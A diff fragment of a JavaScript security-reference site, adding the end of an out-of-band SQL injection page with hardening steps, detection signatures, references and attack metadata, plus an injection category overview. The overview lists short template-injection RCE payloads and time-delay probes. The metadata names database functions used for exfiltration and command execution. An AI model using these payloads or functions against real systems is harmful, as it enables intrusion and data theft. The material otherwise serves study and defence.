+| Revoke EXECUTE on xp_dirtree from PUBLIC | MSSQL | \`REVOKE EXECUTE ON xp_dirtree TO PUBLIC\` |
+| Restrict network ACLs | Oracle | Only grant UTL_HTTP/UTL_INADDR to accounts that need it |
+| Revoke EXECUTE on DBMS_LDAP from PUBLIC | Oracle | Often overlooked grant |
+| Disable COPY TO PROGRAM | PostgreSQL | Do not grant superuser to application accounts |
+| Disable load_extension | SQLite | Default behavior -- do not enable |
+| Disable httpfs extension | DuckDB | Do not install/load in production |
+
+### Application-Level Defenses
+
+- **Parameterized queries** -- the only complete defense against SQL injection of any type
+- **Principle of least privilege** -- database connections should use accounts with minimal permissions (no sysadmin, no FILE privilege, no superuser)
+- **WAF rules for OOB signatures** -- detect xp_dirtree, UTL_HTTP, DBMS_LDAP, LOAD_FILE, COPY TO PROGRAM, XMLType+DOCTYPE patterns in input
+- **Audit logging on OOB functions** -- monitor database audit logs for calls to known OOB-capable functions
+
+### OOB-Specific Detection Signatures
+
+Monitor for these patterns in database audit logs, network traffic, and WAF logs:
+
+**SQL-level signatures**:
+- \`xp_dirtree\`, \`xp_fileexist\`, \`xp_subdirs\`, \`xp_cmdshell\` in any query
+- \`UTL_HTTP\`, \`UTL_INADDR\`, \`DBMS_LDAP\`, \`HTTPURITYPE\`, \`UTL_TCP\`, \`UTL_SMTP\`
+- \`EXTRACTVALUE\`, \`xmltype\`, \`DOCTYPE\`, \`ENTITY\`, \`SYSTEM\`
+- \`LOAD_FILE\`, \`INTO OUTFILE\`, \`INTO DUMPFILE\`, \`LOAD DATA INFILE\`
+- \`COPY TO PROGRAM\`, \`dblink\`, \`dblink_connect\`
+- UNC path patterns: \`\\\\\` followed by a domain name
+
+**DNS-level signatures**:
+- DNS queries from database server IPs to unknown external domains
+- Subdomain labels with unusual length (>20 chars) containing hex or base64 patterns
+- Burst DNS queries to novel domains (high query rate from non-DNS-active hosts)
+- DNS queries containing database artifact patterns (version strings, hash-like values)
+
+**Network-level signatures**:
+- Outbound HTTP from database server IPs to unknown external hosts
+- SMB (TCP 445) connections from database servers to external IPs
+- LDAP (TCP 389) connections from database servers to unknown hosts
+- Known OOB interaction domains: \`*.burpcollaborator.net\`, \`*.oast.pro\`, \`*.oast.fun\`, \`*.interact.sh\`
+
+---
+
+## References
+
+### Primary Sources
+- PortSwigger -- Blind SQL Injection: https://portswigger.net/web-security/sql-injection/blind
+- PortSwigger -- SQL Injection Cheat Sheet: https://portswigger.net/web-security/sql-injection/cheat-sheet
+- PortSwigger Research -- OAST: https://portswigger.net/blog/oast-out-of-band-application-security-testing
+- OWASP WSTG 4.7.5 -- Testing for SQL Injection: https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection
+
+### Standards
+- CWE-89 -- Improper Neutralization of Special Elements in SQL Command: https://cwe.mitre.org/data/definitions/89.html
+- CAPEC-7 -- Blind SQL Injection: https://capec.mitre.org/data/definitions/7.html
+
+### Labs
+- PortSwigger Lab -- OOB Interaction: https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-interaction
+- PortSwigger Lab -- OOB Data Exfiltration: https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration
+
+### CVEs
+- CVE-2023-48788 (FortiClientEMS): https://nvd.nist.gov/vuln/detail/CVE-2023-48788
+- CVE-2024-43468 (Microsoft SCCM): https://nvd.nist.gov/vuln/detail/CVE-2024-43468
+- CVE-2024-8924 (ServiceNow): https://nvd.nist.gov/vuln/detail/CVE-2024-8924
+- CVE-2024-6670 (WhatsUp Gold): https://nvd.nist.gov/vuln/detail/CVE-2024-6670
+- CVE-2023-34362 (MOVEit Transfer): https://nvd.nist.gov/vuln/detail/CVE-2023-34362
+- CVE-2024-42327 (Zabbix): https://nvd.nist.gov/vuln/detail/CVE-2024-42327
+- CVE-2021-27101 (Accellion FTA): https://nvd.nist.gov/vuln/detail/CVE-2021-27101
+- CVE-2024-9264 (Grafana DuckDB): https://nvd.nist.gov/vuln/detail/CVE-2024-9264
+- CVE-2024-36412 (SuiteCRM): https://nvd.nist.gov/vuln/detail/CVE-2024-36412
+- CVE-2024-21080 (Oracle EBS): https://nvd.nist.gov/vuln/detail/CVE-2024-21080
+
+### Writeups
+- Horizon3.ai -- CVE-2023-48788 Deep Dive: https://horizon3.ai/attack-research/attack-blogs/cve-2023-48788-fortinet-forticlientems-sql-injection-deep-dive/
+- NetSPI -- Second-Order SQLi DNS Egress: https://www.netspi.com/blog/technical-blog/web-application-pentesting/second-order-sql-injection-with-stored-procedures-dns-based-egress/
+- Ryan Wendel -- DNS Exfiltration via Blind SQLi: https://www.ryanwendel.com/2020/02/20/dns-exfiltration-thru-blind-sql-injection-in-a-mssql-environment/
+- Tarlogic -- Red Team Tales: https://www.tarlogic.com/blog/red-team-tales-0x01/
+- PentestBlog -- DNS Exfiltration in SQLi: https://pentest.blog/data-ex-filtration-with-dns-in-sqli-attacks/
+
+### Academic Papers
+- Stampar, M. -- Data Retrieval over DNS in SQL Injection Attacks: https://arxiv.org/abs/1303.3047
+- DNS Exfiltration Detection (IJIS 2023): https://link.springer.com/article/10.1007/s10207-023-00723-w
+- Real-Time DNS Exfiltration Detection via ML (Electronics 2023): https://www.mdpi.com/2079-9292/12/6/1467
+
+### Tools
+- sqlmap: https://sqlmap.org
+- interactsh: https://github.com/projectdiscovery/interactsh
+- ODAT: https://github.com/quentinhardy/odat
+- Collabfiltrator: https://github.com/0xC01DF00D/Collabfiltrator
+- PowerUpSQL: https://github.com/NetSPI/PowerUpSQL
+
+### Breach Reports
+- CISA Advisory AA23-158A (MOVEit): https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-158a
+- CISA Advisory AA21-055A (Accellion FTA): https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-055a
+
+### Payload Repositories
+- PayloadsAllTheThings -- MSSQL: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md
+- PayloadsAllTheThings -- Oracle: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/OracleSQL%20Injection.md
+- PayloadsAllTheThings -- PostgreSQL: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md
+- NetSPI -- SQL Server UNC Path Injection Cheat Sheet: https://github.com/NetSPI/PowerUpSQL/wiki/SQL-Server---UNC-Path-Injection-Cheat-Sheet
+
+---
+
+## AI Agent Metadata
+
+\`\`\`json
+{
+  "id": "WEB-CAT01-SQLi-OutOfBand",
+  "title": "Out-of-Band (OOB) SQL Injection",
+  "category": "CAT-01-Injection-Attacks",
+  "subcategory": "SQL Injection",
+  "variant": "Out-of-Band",
+  "severity": "CRITICAL",
+  "cvss_base": 9.8,
+  "cwe": ["CWE-89"],
+  "capec": ["CAPEC-7"],
+  "owasp": "A05:2025",
+  "mitre_attack": ["T1190", "T1059", "T1505.003", "T1552.001", "T1005", "T1048.003", "T1048.001", "T1041", "T1071.004"],
+  "affected_databases": ["MSSQL", "Oracle", "PostgreSQL", "MySQL", "DuckDB", "SQLite"],
+  "oob_functions": {
+    "mssql": ["xp_dirtree", "xp_fileexist", "xp_subdirs", "xp_cmdshell", "fn_xe_file_target_read_file", "fn_get_audit_file", "fn_trace_gettable", "OPENROWSET", "sp_OACreate", "CLR Assembly", "sp_add_jobstep"],
+    "oracle": ["XMLType XXE", "UTL_INADDR", "UTL_HTTP", "HTTPURITYPE", "DBMS_LDAP.INIT", "UTL_TCP", "UTL_SMTP", "DBMS_CLOUD", "DBMS_XMLGEN"],
+    "postgresql": ["COPY TO PROGRAM", "dblink_connect", "lo_export", "system() UDF"],
+    "mysql": ["LOAD_FILE (UNC)", "INTO OUTFILE (UNC)", "UDF sys_exec"],
+    "duckdb": ["read_csv_auto (HTTP)", "read_text", "read_blob", "read_json_auto (HTTP)", "httpfs extension", "COPY TO (S3)", "read_parquet (S3)", "ATTACH (HTTPS/S3)", "getenv (CLI)", "http_request ext (HTTP POST)", "shellfs ext (RCE)"]
+  },
+  "exfiltration_protocols": ["DNS", "HTTP", "HTTPS", "SMB", "LDAP", "SMTP", "TCP", "S3"],
+  "tools": ["Burp Collaborator", "interactsh", "sqlmap", "ODAT", "Collabfiltrator", "PowerUpSQL", "Responder"],
+  "cves_documented": [
+    "CVE-2023-48788",
+    "CVE-2024-43468",
+    "CVE-2024-8924",
+    "CVE-2024-6670",
+    "CVE-2023-34362",
+    "CVE-2024-42327",
+    "CVE-2021-27101",
+    "CVE-2024-9264",
+    "CVE-2024-36412",
+    "CVE-2024-21080"
+  ],
+  "cross_referenced_cves": {
+    "CVE-2024-43468": "01-Classic-In-Band.md",
+    "CVE-2024-8924": "04-Boolean-Based-Blind.md",
+    "CVE-2023-34362": "01-Classic-In-Band.md, 04-Boolean-Based-Blind.md"
+  },
+  "payload_count": 115,
+  "waf_bypass_techniques": 15,
+  "key_research": [
+    "PortSwigger -- OAST methodology (zero false positive OOB detection)",
+    "Stampar 2012 -- DNS data retrieval (sqlmap --dns-domain foundation)",
+    "Horizon3.ai -- CVE-2023-48788 xp_cmdshell re-enablement chain",
+    "CVE-2024-9264 -- DuckDB embedded OLAP OOB (novel vector)"
+  ],
+  "unique_coverage": [
+    "DuckDB embedded OLAP OOB paradigm shift (CVE-2024-9264) -- architectural analysis, security controls gaps, modern data stack attack surface",
+    "DuckDB community extension OOB (http_request POST exfil, shellfs RCE)",
+    "Stager technique (4-phase OOB bootstrap methodology)",
+    "Cl0p breach playbook analysis (MOVEit + Accellion)",
+    "Per-DB fallback chains for WAF evasion",
+    "Custom DNS/HTTP listener code (Python)",
+    "DNS binary search technique"
+  ],
+  "prerequisites": "User-controllable input in SQL query, no parameterization, database with outbound network access",
+  "signal": "None in HTTP response -- data arrives via separate DNS/HTTP/SMB channel",
+  "related_pages": [
+    "01-Classic-In-Band.md",
+    "02-Error-Based.md",
+    "03-Union-Based.md",
+    "04-Boolean-Based-Blind.md",
+    "05-Time-Based-Blind.md"
+  ],
+  "series_position": "6 of 6 (final SQLi page)"
+}
+\`\`\`
+`;
+
 CATEGORIES[0].content = "# CAT-01: Injection Attacks\n\n> **Domain:** Web Application -- **Phase:** 1 -- **CAPEC Category:** Inject Unexpected Items\n\n---\n\n## Category Overview\n\nInjection attacks occur when untrusted, attacker-controlled data is sent to an interpreter -- a database engine, OS shell, LDAP server, template engine, XML parser, or any other component that evaluates input as code or a command. The interpreter cannot distinguish between the intended instruction and the injected content, executing both.\n\nThe fundamental precondition for all injection vulnerabilities is the same: **user-controlled data is concatenated into a query, command, or expression without sufficient sanitization, parameterization, or contextual escaping.** The interpreter is working as designed -- the vulnerability is in how the application constructs the input to that interpreter.\n\n**Why it persists:** Developer trust of user input remains pervasive in legacy codebases, ORMs create false confidence, and WAF bypass techniques continuously outpace signature-based defenses. Injection was #1 on the OWASP Top 10 for over a decade and remains in the top 5 in 2025.\n\n---\n\n## Attack Surface Map\n\n```mermaid\ngraph TD\n    USER[User / Attacker Input] --> FORMS[HTML Forms]\n    USER --> PARAMS[URL Parameters]\n    USER --> HEADERS[HTTP Headers]\n    USER --> COOKIES[Cookies]\n    USER --> JSON[JSON / XML Body]\n    USER --> WSOCK[WebSocket Messages]\n    FORMS & PARAMS & HEADERS & COOKIES & JSON & WSOCK --> APP[Web Application]\n    APP --> SQL[SQL Engine]\n    APP --> NOSQL[NoSQL Engine]\n    APP --> OS[Operating System Shell]\n    APP --> LDAP[LDAP Directory]\n    APP --> XPATH[XPath / XML Parser]\n    APP --> TMPL[Template Engine]\n    APP --> EL[Expression Language]\n    APP --> LLM[LLM / AI Model]\n    SQL --> |SQLi| SQLI[Data theft - Auth bypass - RCE]\n    NOSQL --> |NoSQLi| NOSQLI[Auth bypass - Data exfiltration]\n    OS --> |CMDi| CMDI[RCE - Reverse shell]\n    LDAP --> |LDAPi| LDAPI[Auth bypass - Directory enum]\n    XPATH --> |XPathi| XPATHI[Data extraction - Auth bypass]\n    TMPL --> |SSTI| SSTII[RCE - Config read]\n    EL --> |ELi| ELI[RCE via OGNL - Spring SpEL]\n    LLM --> |Prompt Inj| PROMPTI[Goal hijack - Data exfil]\n```\n\n---\n\n## Attack Types in This Category\n\n| ID | Attack Type | Key CWEs | Subtypes | Severity |\n|----|------------|---------|---------|----------|\n| T01 | SQL Injection | CWE-89 | 12 | CRITICAL |\n| T02 | NoSQL Injection | CWE-943 | 5 | CRITICAL |\n| T03 | OS Command Injection | CWE-78 | 5 | CRITICAL |\n| T04 | SSTI | CWE-94, CWE-1336 | 9 | CRITICAL |\n| T05 | LDAP Injection | CWE-90 | 4 | HIGH |\n| T06 | XPath Injection | CWE-643 | 3 | HIGH |\n| T07 | EL / OGNL Injection | CWE-917 | 5 | CRITICAL |\n| T08 | XML Injection | CWE-91 | 4 | HIGH |\n| T09 | CRLF Injection | CWE-93, CWE-113 | 4 | HIGH |\n| T10 | Code Injection | CWE-94, CWE-95 | 5 | CRITICAL |\n| T11 | ORM Injection | CWE-89 | 4 | HIGH |\n| T12 | JSON Injection | CWE-74 | 4 | MEDIUM |\n| T13 | HTML Injection | CWE-79, CWE-80 | 3 | MEDIUM |\n| T14 | SMTP Injection | CWE-93 | 4 | MEDIUM |\n| T15 | Prompt Injection | CWE-1427 | 6 | HIGH |\n\n---\n\n## Universal Injection Pattern\n\nAll injection attacks share the same structural vulnerability:\n\n```\nVULNERABLE:\nquery = \"SELECT * FROM users WHERE id = \" + userInput\nuserInput = \"1 OR 1=1--\"\nquery = \"SELECT * FROM users WHERE id = 1 OR 1=1--\"  <-- Logic altered\n\nSECURE:\nquery = \"SELECT * FROM users WHERE id = ?\"\nexecute(query, [userInput])\nuserInput is data, never code -- interpreter separation maintained\n```\n\n---\n\n## Detection Heuristics (All Injection Types)\n\n| Probe Type | Payload Pattern | Indicator |\n|-----------|----------------|----------|\n| Error-based | `'`, `\"`, `)`, `` ` `` | Interpreter error in response |\n| Boolean differential | `AND 1=1`, `AND 1=2` | Different response content |\n| Time-based | `SLEEP(5)`, `WAITFOR DELAY` | Delayed response |\n| Out-of-band | DNS/HTTP callback payloads | External request received |\n| Syntax probe | `{{7*7}}`, `${7*7}`, `<%= 7*7 %>` | `49` in response (SSTI/EL) |\n\n---\n\n## Injection by Interpreter\n\n<details>\n<summary><b>SQL -- Database Engines</b></summary>\n\n| Engine | Characteristic Syntax | Time Delay | Comment |\n|--------|----------------------|-----------|--------|\n| MySQL | `SLEEP(N)`, `-- -` | `SLEEP(5)` | `#` comment also works |\n| PostgreSQL | `pg_sleep(N)`, `--` | `pg_sleep(5)` | Stacked queries with `;` |\n| MSSQL | `WAITFOR DELAY`, `--` | `WAITFOR DELAY '0:0:5'` | `xp_cmdshell` for RCE |\n| Oracle | `dbms_pipe.receive_message` | `dbms_pipe.receive_message(('a'),5)` | No stacked queries |\n| SQLite | `randomblob(N)` | `randomblob(500000000)` | Limited OOB options |\n\n</details>\n\n<details>\n<summary><b>SSTI -- Template Engines by Language</b></summary>\n\n| Engine | Language | Probe | RCE Payload Pattern |\n|--------|----------|-------|-------------------|\n| Jinja2 | Python | `{{7*7}}` | `{{''.__class__.__mro__[1].__subclasses__()}}` |\n| Twig | PHP | `{{7*7}}` | `{{_self.env.registerUndefinedFilterCallback('exec')}}` |\n| Freemarker | Java | `${7*7}` | `<#assign ex=\"freemarker.template.utility.Execute\"?new()>` |\n| Velocity | Java | `#set($x=7*7)$x` | Reflection-based RCE |\n| Smarty | PHP | `{php}phpinfo();{/php}` | Direct PHP execution (legacy) |\n| ERB | Ruby | `<%= 7*7 %>` | `<%= system('id') %>` |\n\n</details>\n\n---\n\n## Prevention -- Universal Principles\n\n1. **Parameterized Queries / Prepared Statements** -- for all database interactions\n2. **Contextual Output Encoding** -- HTML, JS, URL, CSS context-aware escaping\n3. **Input Validation** -- allowlist approach for known-good values\n4. **Principle of Least Privilege** -- database accounts with minimal permissions\n5. **WAF as defense-in-depth** -- never as primary control\n6. **ORM safely** -- avoid raw query methods\n7. **Sandboxed template engines** -- no user-controlled template content\n\n---\n\n## References\n\n### Primary Standards\n- [OWASP -- Injection (A05:2025)](https://owasp.org/Top10/2025/A05_2025-Injection/)\n- [OWASP WSTG -- Testing for Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/)\n- [CWE-74: Improper Neutralization](https://cwe.mitre.org/data/definitions/74.html)\n- [CAPEC-152: Inject Unexpected Items](https://capec.mitre.org/data/definitions/152.html)\n\n### Deep Research\n- [PortSwigger -- SQL Injection](https://portswigger.net/web-security/sql-injection)\n- [PortSwigger -- SSTI](https://portswigger.net/research/server-side-template-injection)\n- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)";
 
 
@@ -9006,7 +11410,8 @@ var SUBTYPE_CHILDREN = {
     {name: 'Error-Based', slug: 'sqli-error-based', done: true},
     {name: 'Union-Based', slug: 'sqli-union-based', done: true},
     {name: 'Boolean-Based Blind', slug: 'sqli-blind-boolean', done: true},
-    {name: 'Time-Based Blind', slug: 'sqli-time-blind', done: true}
+    {name: 'Time-Based Blind', slug: 'sqli-time-blind', done: true},
+    {name: 'Out-of-Band', slug: 'sqli-oob', done: true}
   ]
 };
 function getSubtypeSlug(catSlug, typeName) {
@@ -9163,6 +11568,7 @@ function renderPage(hash) {
   else if (hash === 'sqli-union-based') { document.title = 'GORGE | Union-Based SQLi'; renderSubtypePage('CAT-01', 'SQL Injection', 'Union-Based SQLi', PAGES.sqli_union_based); }
   else if (hash === 'sqli-error-based') { document.title = 'GORGE | Error-Based SQLi'; renderSubtypePage('CAT-01', 'SQL Injection', 'Error-Based SQLi', PAGES.sqli_error_based); }
   else if (hash === 'sqli-blind-boolean') { document.title = 'GORGE | Boolean-Based Blind SQLi'; renderSubtypePage('CAT-01', 'SQL Injection', 'Boolean-Based Blind SQLi', PAGES.sqli_blind_boolean); }
+  else if (hash === 'sqli-oob') { document.title = 'GORGE | Out-of-Band SQLi'; renderSubtypePage('CAT-01', 'SQL Injection', 'Out-of-Band SQLi', PAGES.sqli_oob); }
   else {
     var cat = findCategory(hash);
     if (cat) { document.title = 'GORGE | ' + cat.id + ' ' + cat.name; renderCategoryPage(cat); }
